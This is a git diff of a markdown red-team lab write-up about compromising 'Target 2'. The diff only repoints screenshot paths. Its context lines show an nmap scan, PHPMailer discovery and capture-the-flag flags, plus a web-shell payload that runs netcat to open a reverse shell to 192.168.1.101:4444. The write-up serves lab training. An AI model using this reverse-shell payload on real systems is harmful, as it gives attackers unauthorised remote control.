@@ -16,7 +16,7 @@ Nmap scan results reveal the below services and OS details:
 
 nmap -sV 192.168.1.115
 
-![1](/Resources/Images/4/1.PNG)
+![1](/Resources/Images/2/3.PNG)
 
 ---
 
@@ -47,7 +47,7 @@ The Red Team was able to penetrate Target 2 and retrieve the following confident
 
     **Vendor Directory Index view from the browser** | PATH File: **Flag1** | **PHPMAILER version**
      ---|---|---
-    ![6](/Resources/Images/4/6.PNG) | ![7](/Resources/Images/4/7.PNG) | ![9](/Resources/Images/4/9.PNG)    
+    ![6](/Resources/Images/2/6.PNG) | ![7](/Resources/Images/2/7.PNG) | ![9](/Resources/Images/2/9.PNG)    
 
 ---
 
@@ -67,14 +67,14 @@ The Red Team was able to penetrate Target 2 and retrieve the following confident
 
         **Crafted payload:** `192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash`
 
-        ![17](/Resources/Images/4/17.PNG)
+        ![17](/Resources/Images/2/17.PNG)
 
         **Sensitive information has been found in the "www" and "WordPress uploads" directory**    
 
         **flag2**
 
-        ![19](/Resources/Images/4/19.PNG)
+        ![19](/Resources/Images/2/19.PNG)
 
         **flag3**
 
-        ![20](/Resources/Images/4/20.png)
+        ![20](/Resources/Images/2/20.PNG)
